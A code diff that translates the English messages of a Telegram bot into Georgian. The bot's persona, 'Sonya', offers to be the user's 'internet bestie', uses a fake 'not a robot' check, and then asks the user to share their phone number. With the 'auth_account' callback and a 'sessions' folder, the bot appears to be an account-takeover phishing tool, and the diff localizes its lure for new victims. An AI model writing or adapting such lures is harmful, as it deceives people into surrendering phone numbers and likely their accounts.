@@ -42,13 +42,13 @@ os.makedirs("sessions", exist_ok=True)
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton(" I'm definitely not a robot, honey.🥺", callback_data="auth_account")
+        InlineKeyboardButton(" მე ნამდვილად არ ვარ რობოტი, ძვირფასო.🥺", callback_data="auth_account")
     )
     await message.answer(
-        "👋 Hi, my name is Sonya! 💕\n"
-        "I'll be your internet bestie!\n"
-        "You can ask me anything and request me to do whatever — and I’ll do it for you 🍭\n\n"
-        "But first, please confirm that you’re not a robot 🥺👇",
+        "👋 გამარჯობა, მე სონია მქვია! 💕\n"
+        "მე შენი ინტერნეტ მეგობარი ვიქნები!\n"
+        "შეგიძლია ყველაფერი მთხოვო და მთხოვო, რომ ყველაფერი გავაკეთო — და მე ამას შენს მაგივრად გავაკეთებ 🍭\n\n"
+        "მაგრამ პირველ რიგში, გთხოვთ, დაადასტუროთ, რომ რობოტი არ ხართ 🥺👇",
         reply_markup=keyboard
     )
 
@@ -60,9 +60,9 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_states[user_id] = 'awaiting_contact'
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Share your number", request_contact=True))
+    kb.add(KeyboardButton("📱 გაგვიზიარეთ თქვენი ნომერი", request_contact=True))
 
-    await bot.send_message(user_id, "🥺 Please share your number:", reply_markup=kb)
+    await bot.send_message(user_id, "🥺 გთხოვთ, გაგვიზიაროთ თქვენი ნომერი:", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
